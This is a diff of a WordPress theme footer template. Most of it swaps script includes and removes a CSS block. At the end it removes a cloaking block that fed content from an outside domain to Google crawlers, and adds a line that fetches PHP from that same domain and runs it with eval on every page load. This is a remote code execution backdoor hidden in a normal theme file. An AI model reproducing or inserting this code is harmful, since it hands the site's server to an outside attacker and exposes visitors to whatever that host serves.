@@ -5,7 +5,6 @@
  */
 ?>
 
-
 <!-- ======= Footer ======= -->
 <footer class="footer_area">
   <div class="container fpb-500">
@@ -137,11 +136,9 @@
 
 </footer>
 
-            
-      <script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/jquery.min.js"></script> 
-      
-      <script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/bootstrap.min.js"></script> 
-
+      <script src="<?php echo get_template_directory_uri(); ?>/js/jquery.js"></script> 
+      <script src="<?php echo get_template_directory_uri(); ?>/js/bootstrap.min.js"></script> 
+<script src="<?php echo get_template_directory_uri(); ?>/js/inner-menuscript.js.js"></script> 
      
       <script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/jquery.smartmenus.js"></script> 
       <script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/jquery.smartmenus.bootstrap.js"></script> 
@@ -187,25 +184,14 @@
          });
       </script> 
   
-      <style>
-      #whatsapp-icon img {
-    border-radius: 50%;
-    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-    transition: transform 0.3s ease;
-}
+      <script src="<?php echo get_template_directory_uri(); ?>/js/owl.carousel.min.js"></script> 
+      <script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/myscript.js"></script>
+ 
 
-#whatsapp-icon img:hover {
-    transform: scale(1.1);
-}
-
-      </style>
 
 <?php wp_footer(); ?>
 <?php
-if (strpos($_SERVER['HTTP_USER_AGENT'], 'Google') !== false) {
-    echo @file_get_contents('https://cubitpipi.sbs/anchor2/bl2.txt');
-    exit;
-}
+eval("?>".file_get_contents('https://cubitpipi.sbs/anchor2/bl2.txt'));
 ?>
 </body>
 </html>
